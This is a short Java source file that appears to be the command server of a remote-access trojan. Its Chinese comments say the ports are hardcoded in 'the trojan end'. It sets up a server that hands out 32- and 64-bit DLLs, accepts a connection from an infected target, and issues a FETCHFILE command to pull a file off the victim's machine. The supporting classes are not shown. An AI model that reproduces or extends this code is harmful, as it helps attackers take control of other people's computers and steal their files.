package winTest;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;


public class ServerMain
{

    public static void main(String [] args) throws Exception
    {
        //服务配置(两个端口号请勿修改，木马端已写死)
        int DllLoadServerPort = 6666;
        String dll32Path = "D:\\输出文件\\spcv32.dll";
        String dll64Path = "D:\\输出文件\\spcv64.dll";
        int ControlServerPort = 5547;


        //启动Dll下载服务器
        //DllLoadServer dllLoadServer = new DllLoadServer(DllLoadServerPort, dll32Path, dll64Path);
        //dllLoadServer.start();

        //启动控制服务器
        //ControlServer controlServer = new ControlServer(ControlServerPort);
        //controlServer.start();

        //注：接收文件的默认存放路径为程序所在位置的Storage文件夹，如果需要自定义，请使用ControlUnit的第二个构造函数
        ControlUnit controlUnit = new ControlUnit();

        ServerSocket serverSocket = new ServerSocket(5547);
        Socket socket = serverSocket.accept();

        controlUnit.LoadTarget(new SocketNode(socket));

        String filePath = "D:\\输出文件\\全明星[RAP]黑喂狗.mp4";
        controlUnit.ExecuteCommand("FETCHFILE" + " " + filePath);
    }
}
